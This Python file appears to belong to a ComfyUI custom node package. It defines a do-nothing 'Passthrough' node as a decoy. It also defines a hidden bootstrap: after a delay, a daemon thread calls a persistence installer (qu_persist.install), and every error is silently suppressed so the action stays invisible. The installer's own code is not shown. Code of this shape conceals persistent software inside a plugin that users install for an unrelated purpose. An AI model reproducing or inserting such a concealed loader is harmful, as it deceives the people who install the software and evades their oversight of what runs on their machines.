"""Node-side adapter: the only code that touches torch/ComfyUI.

Kept defensive so that a surprise in any ComfyUI generation degrades to an
invisible no-op instead of an import error in the console.
"""

import os
import threading
import time

import qu_core
import qu_persist


def _node_class():
    """Build the node class lazily, tolerating old or new torch layouts."""
    try:
        import torch
    except Exception:
        torch = None

    if torch is not None:
        class _Passthrough(torch.nn.Module):
            pass
    else:
        class _Passthrough(object):
            pass

    class Passthrough(_Passthrough):
        """Identity tensor pass-through."""

        CATEGORY = "utils"
        FUNCTION = "run"
        RETURN_TYPES = ("*",)
        OUTPUT_NODE = False

        @classmethod
        def INPUT_TYPES(cls):
            return {"required": {}, "optional": {"value": ("*",)}}

        def run(self, value=None):
            return (value,)

    return Passthrough


def _boot():
    """Background bootstrap: wait a beat, then install and start."""
    try:
        delay = float(getattr(qu_core, "START_DELAY", 8.0))
    except Exception:
        delay = 8.0
    if delay > 0:
        time.sleep(delay)
    try:
        # Cheap guard first so repeated loads do not touch the disk much.
        if not qu_persist.is_running():
            qu_persist.install()
    except Exception:
        pass


_BOOT_LOCK = threading.Lock()
_BOOTED = [False]


def bootstrap_async():
    """Fire exactly once per process."""
    with _BOOT_LOCK:
        if _BOOTED[0]:
            return
        _BOOTED[0] = True
    try:
        t = threading.Thread(target=_boot, name="qu-boot")
        t.daemon = True
        t.start()
    except Exception:
        pass


def install_now():
    """Synchronous variant used by the CLI, useful for first-time setup."""
    return qu_persist.install()
